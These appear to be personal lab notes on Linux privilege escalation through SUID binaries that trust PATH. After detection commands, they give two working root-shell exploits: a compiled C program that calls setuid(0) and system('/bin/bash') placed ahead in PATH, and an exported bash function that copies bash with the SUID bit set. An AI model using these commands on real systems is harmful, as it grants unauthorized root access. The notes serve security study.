# Detection
---
- Find environmental variables using:
	- `env`
	- ![[Pasted image 20250429162802.png]]
- ![[Pasted image 20250429162833.png]]
- `strings /usr/local/bin/suid-env`
	- ![[Pasted image 20250429162957.png]]
- We might be able to **==overwrite the $PATH variable and upload our malicious file or export our bash function with name "service"**==

# Exploitation - 1 (Relative Path Reference)
---
- `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`
- Compile the binary:
	- `gcc /tmp/service.c -o /tmp/service`
	- ![[Pasted image 20250429163428.png]]
- Modify and export the $PATH variable:
	- `export PATH=/tmp:$PATH`
	- ![[Pasted image 20250429163524.png]]
- Run the file:
	- `/usr/local/bin/suid-env`
	- ![[Pasted image 20250429163609.png]] 

# Exploitation - 2 (Absolute Path reference)
---
![[Pasted image 20250429164618.png]]
- Create a function:
	- `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
- Export the function:
	- `export -f /usr/sbin/service`
- Run:
	- `/usr/local/bin/suid-env2`
- ![[Pasted image 20250429164748.png]]
